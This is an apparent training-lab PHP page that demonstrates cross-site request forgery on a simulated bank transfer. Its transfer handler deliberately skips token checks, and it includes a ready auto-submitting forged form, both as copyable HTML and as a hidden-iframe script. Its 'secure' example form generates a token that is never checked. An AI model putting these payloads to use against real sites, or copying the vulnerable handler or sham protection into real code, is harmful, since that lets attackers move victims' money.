
<?php
session_start();

// Simulated bank account
if (!isset($_SESSION['balance'])) {
    $_SESSION['balance'] = 5000;
    $_SESSION['username'] = 'victim';
}

// CSRF-vulnerable transfer function
if (isset($_POST['amount']) && isset($_POST['to_account'])) {
    $amount = (int)$_POST['amount'];
    $to = $_POST['to_account'];
    
    // VULNERABLE: No CSRF token validation!
    if ($amount > 0 && $amount <= $_SESSION['balance']) {
        $_SESSION['balance'] -= $amount;
        $message = "✅ Transferred \${$amount} to account: {$to}";
    } else {
        $message = "❌ Invalid amount";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Vulnerability</title>
    <style>
        body { padding: 20px; font-family: Arial; }
        .bank { background: #007bff; color: white; padding: 20px; border-radius: 10px; margin: 20px 0; }
        form { background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0; }
        input { padding: 10px; margin: 10px; }
        button { padding: 10px 20px; background: #28a745; color: white; border: none; cursor: pointer; }
        .attack { background: #dc3545; color: white; padding: 15px; margin: 20px 0; }
        .hidden-form { display: none; }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #3498db;
            text-decoration: none;
            font-weight: 500;
            transition: color 0.3s ease;
        }
    </style>
</head>
<body>
    <h2>🔄 CSRF (Cross-Site Request Forgery) Test</h2>
    
    <div class="bank">
        <h3>Welcome, <?php echo $_SESSION['username']; ?>!</h3>
        <p><strong>Account Balance:</strong> $<?php echo $_SESSION['balance']; ?></p>
        <p><strong>Account Number:</strong> ACC-<?php echo session_id(); ?></p>
    </div>
    
    <?php if (isset($message)): ?>
    <div style="background: #d4edda; padding: 15px; margin: 20px 0;">
        <?php echo $message; ?>
    </div>
    <?php endif; ?>
    
    <form method="POST" id="transferForm">
        <h3>Bank Transfer</h3>
        <p>Transfer Amount: $<input type="number" name="amount" value="100" min="1"></p>
        <p>To Account: <input type="text" name="to_account" value="ACC-123456"></p>
        <button type="submit">Transfer Money</button>
        
        <div style="margin-top: 15px; color: #666;">
            <strong>⚠️ VULNERABLE:</strong> This form has no CSRF protection!
        </div>
    </form>
    
    <div class="attack">
        <h3>🎯 CSRF Attack Demo</h3>
        <p>Copy this malicious HTML and open it in another tab:</p>
        <textarea style="width:100%;height:150px;font-family:monospace;">
<!-- Malicious website: attacker.com -->
<html>
<body>
    <h1>Free Bitcoin! Click here!</h1>
    <img src="http://<?php echo $_SERVER['HTTP_HOST']; ?>/csrf.php" width="0" height="0">
    
    <form action="http://<?php echo $_SERVER['HTTP_HOST']; ?>/csrf.php" 
          method="POST" id="evilForm" style="display:none;">
        <input type="hidden" name="amount" value="1000">
        <input type="hidden" name="to_account" value="ATTACKER-999">
    </form>
    
    <script>
        // Auto-submit the form
        document.getElementById('evilForm').submit();
    </script>
</body>
</html>
        </textarea>
        
        <p style="margin-top: 10px;">
            <button onclick="demonstrateCSRF()">🔓 Demonstrate CSRF Attack</button>
        </p>
    </div>
    
    <div style="background: #fff3cd; padding: 20px; margin: 20px 0;">
        <h3>🛡️ CSRF Protection Methods:</h3>
        <ul>
            <li><strong>CSRF Tokens:</strong> Unique token per session/form</li>
            <li><strong>SameSite Cookies:</strong> Set cookie with SameSite attribute</li>
            <li><strong>Double Submit Cookie:</strong> Token in cookie and form</li>
            <li><strong>Custom Headers:</strong> Require X-Requested-With header</li>
            <li><strong>Referer Validation:</strong> Check HTTP Referer header</li>
        </ul>
        
        <h4>Secure Form Example (with CSRF token):</h4>
        <form method="POST" style="background:#d4edda;padding:15px;">
            <input type="hidden" name="csrf_token" value="<?php echo bin2hex(random_bytes(32)); ?>">
            <p>Amount: <input type="number" name="amount" value="100"></p>
            <p>To: <input type="text" name="to_account"></p>
            <button type="submit">Secure Transfer</button>
            <p><small>✅ This form includes CSRF protection</small></p>
        </form>
    </div>
    
    <script>
    function demonstrateCSRF() {
        // Create a hidden iframe to simulate attack
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.srcdoc = `
            <html>
            <body>
                <form id="autoSubmit" action="csrf.php" method="POST">
                    <input type="hidden" name="amount" value="500">
                    <input type="hidden" name="to_account" value="HACKER-666">
                </form>
                <script>
                    document.getElementById('autoSubmit').submit();
                <\/script>
            </body>
            </html>
        `;
        
        document.body.appendChild(iframe);
        
        setTimeout(() => {
            alert('CSRF attack simulated! Check your balance.');
            location.reload();
        }, 1000);
    }
    </script>
    
    <div style="text-align: center; margin-top: 30px;">
        <a href="?reset=1" style="padding: 10px 20px; background: #6c757d; color: white; text-decoration: none;">
            Reset Bank Account
        </a>
    </div>
    <a href="nav.php" class="back-link">← Back to Main Menu</a>
    <?php if (isset($_GET['reset'])) { session_destroy(); header('Location: csrf.php'); } ?>
</body>
</html>
